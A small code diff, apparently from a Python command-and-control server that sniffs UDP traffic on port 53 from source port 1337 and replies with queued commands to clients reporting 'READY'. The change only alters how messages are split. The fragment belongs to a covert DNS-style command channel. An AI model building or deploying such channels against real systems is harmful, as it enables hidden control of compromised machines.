@@ -79,7 +79,7 @@ def recieve_msg():
             msg = ""
             rp = sniff(filter="(udp dst port 53) and (udp src port 1337)",
                        prn=concat_msg, stop_filter=parse_end, timeout=100)
-            msg_lst = msg.split()
+            msg_lst = msg.split(" ")
             if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
                 send_cmd(rp, prailer+command)
             elif('READY' != msg_lst[0]):
